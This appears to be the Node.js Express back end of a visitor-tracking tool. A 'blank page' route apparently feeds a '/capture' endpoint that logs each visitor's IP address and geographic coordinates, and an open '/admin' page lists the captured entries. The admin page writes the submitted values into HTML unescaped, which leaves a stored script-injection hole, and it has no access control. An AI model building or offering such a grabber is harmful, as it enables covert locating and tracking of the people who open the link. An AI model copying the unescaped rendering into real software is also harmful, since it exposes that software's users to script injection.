const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.json());

// Array to store captured data
let capturedData = [];

// Endpoint to capture data
app.post('/capture', (req, res) => {
 const { ip, location } = req.body;
 console.log(`IP Address: ${ip}`);
 console.log(`Location: ${JSON.stringify(location)}`);

 // Store the captured data
 capturedData.push({ ip, location, timestamp: new Date() });

 res.sendStatus(200);
});

// Endpoint to serve the admin page
app.get('/admin', (req, res) => {
 res.send(`
 <html>
 <head>
 <title>Admin Page</title>
 </head>
 <body>
 <h1>Captured Data</h1>
 <ul>
 ${capturedData.map((data, index) => `
 <li>
 <p><strong>Entry ${index + 1}</strong></p>
 <p>IP Address: ${data.ip}</p>
 <p>Location: Lat ${data.location.latitude}, Lon ${data.location.longitude}</p>
 <p>Timestamp: ${data.timestamp}</p>
 </li>
 `).join('')}
 </ul>
 </body>
 </html>
 `);
});

// Serve the blank page
app.get('/', (req, res) => {
 res.sendFile(__dirname + '/index.html');
});

app.listen(port, () => {
 console.log(`Server is running on http://localhost:${port}`);
});


